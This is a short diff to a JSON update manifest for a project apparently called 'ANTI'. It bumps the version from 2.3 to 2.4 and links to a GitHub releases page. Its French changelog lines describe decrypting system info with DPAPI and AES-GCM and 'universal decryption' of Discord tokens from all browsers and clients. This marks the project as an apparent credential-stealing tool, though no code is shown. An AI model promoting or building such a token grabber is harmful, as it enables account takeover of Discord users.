@@ -1,5 +1,5 @@
 {
-  "version": "2.3",
-  "changelog": "v2.3: Extraction decryptee infos systeme/Discord DPAPI et AES-GCM",
+  "version": "2.4",
+  "changelog": "v2.4: Décryptage universel des tokens Discord depuis tous les navigateurs et clients",
   "download_url": "https://github.com/AdamZoda/ANTI/releases"
 }
